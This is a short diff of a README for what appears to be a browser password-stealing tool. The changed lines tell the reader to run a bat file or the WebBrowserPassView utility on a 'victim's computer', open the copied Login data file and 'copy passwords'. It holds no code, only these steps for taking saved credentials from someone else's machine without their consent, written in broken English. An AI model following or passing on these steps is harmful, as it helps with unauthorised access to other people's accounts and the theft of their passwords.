@@ -15,13 +15,13 @@ In this version (how it works?):
 
 > copy passwords and you will can go to celebrate it!!!
 
-(If you want to hack passwords slowly in Batch version:)
+(If you want to hack passwords slowly with batch library:)
 
 > Open bat file on victim’s computer (works only in windows).
 
 > Open Login data after bat process. (If file are locked on Mac OS open it with command «mc» (brew install mc))
 
-(If you want to hack passwords fastely:)
+(If you want to hack passwords fastely with WebBrowserPassView:)
 
 > Open WebBrowserPassView in green force on victim's computer (works only in windows)
 
